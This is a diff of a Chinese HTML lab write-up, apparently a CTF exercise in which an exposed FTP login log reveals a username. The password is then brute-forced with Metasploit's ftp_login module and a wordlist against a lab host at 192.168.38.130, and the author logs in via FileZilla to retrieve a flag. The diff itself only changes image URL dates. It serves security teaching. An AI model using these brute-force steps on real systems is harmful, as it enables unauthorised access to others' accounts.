@@ -78,34 +78,34 @@
 <h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><h5 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h5><ul>
 <li>利用ftp日志获取用户名，爆破用户密码,以此用户登录</li>
 </ul>
-<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="步骤1：打开目标网站（192-168-38-130-22）"><a href="#步骤1：打开目标网站（192-168-38-130-22）" class="headerlink" title="步骤1：打开目标网站（192.168.38.130:22）"></a>步骤1：打开目标网站（192.168.38.130:22）</h5><p><img src="https://i.loli.net/2021/10/31/MCIwmKNWq4729Pg.png"></p>
-<h5 id="步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192-168-38-130-22-ftp-txt）"><a href="#步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192-168-38-130-22-ftp-txt）" class="headerlink" title="步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192.168.38.130:22/ftp.txt）"></a>步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192.168.38.130:22/ftp.txt）</h5><p><img src="https://i.loli.net/2021/10/31/Z9xL3iknDOvmj5u.png"></p>
-<p><img src="https://i.loli.net/2021/10/31/ViIKyRxhcWNYUlm.png"></p>
+<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="步骤1：打开目标网站（192-168-38-130-22）"><a href="#步骤1：打开目标网站（192-168-38-130-22）" class="headerlink" title="步骤1：打开目标网站（192.168.38.130:22）"></a>步骤1：打开目标网站（192.168.38.130:22）</h5><p><img src="https://i.loli.net/2025/10/31/MCIwmKNWq4729Pg.png"></p>
+<h5 id="步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192-168-38-130-22-ftp-txt）"><a href="#步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192-168-38-130-22-ftp-txt）" class="headerlink" title="步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192.168.38.130:22/ftp.txt）"></a>步骤2：通过御剑发现存在ftp登录日志，在浏览器上查看ftp登录日志发现成功登录用户的用户名（192.168.38.130:22/ftp.txt）</h5><p><img src="https://i.loli.net/2025/10/31/Z9xL3iknDOvmj5u.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/ViIKyRxhcWNYUlm.png"></p>
 <p><strong>步骤3：打开msf工具准备爆破用户密码</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/10/31/c12HjpqSnLXUPuk.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/c12HjpqSnLXUPuk.png"></p>
 <p><strong>步骤4：搜索msf里ftp_login的相关工具和攻击载荷。</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ftp_login</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/10/31/4mTdWLVl1Fb5OrM.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/4mTdWLVl1Fb5OrM.png"></p>
 <p><strong>步骤5：打开msf里的ftp工具</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/10/31/8jErylxC1ZW2UGN.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/8jErylxC1ZW2UGN.png"></p>
 <p><strong>步骤6：查看需要设置的相关项，“yes”表示必须填写的参数</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/10/31/SwAjM7kGrfyg6zL.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/SwAjM7kGrfyg6zL.png"></p>
 <p><strong>步骤7：修改相关参数</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME icq//设置目标主机登录用户名</span><br><span class="line">set RHOSTS 192.168.38.130//设置目标主机ip地址</span><br><span class="line">set PASS_FILE D:/library.txt//载入密码字典</span><br></pre></td></tr></table></figure>
 
 <p><strong>步骤8：在终端中输入“run”, 开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq,密码为p@ssword。</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="ftp%E6%BA%AF%E6%BA%90.assets/image-20210730000940576.png" alt="image-20210730000940576"></p>
+<p><img src="ftp%E6%BA%AF%E6%BA%90.assets/image-20250730000940576.png" alt="image-20250730000940576"></p>
 <p><strong>步骤9：使用FileZilla输入主机ip（192.168.38.130），用户名（icq），密码（p@ssword），端口（21）通过ftp远程登陆对方主机</strong></p>
-<p><img src="https://i.loli.net/2021/10/31/2SDGJIw5iO4q6VZ.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/2SDGJIw5iO4q6VZ.png"></p>
 <p><strong>步骤10：在用户父目录发现flag文件</strong></p>
 <p><strong>步骤11：下载flag.txt得到flag</strong></p>
 <h4 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h4><p>在本次实验中，利用ftp登录日志分析出成功登录用户的用户名，再利用msf工具中的ftp暴力破解板块对用户密码进行破解，最后通过ftp远程登陆目标主机，在父目录下找到flag。</p>
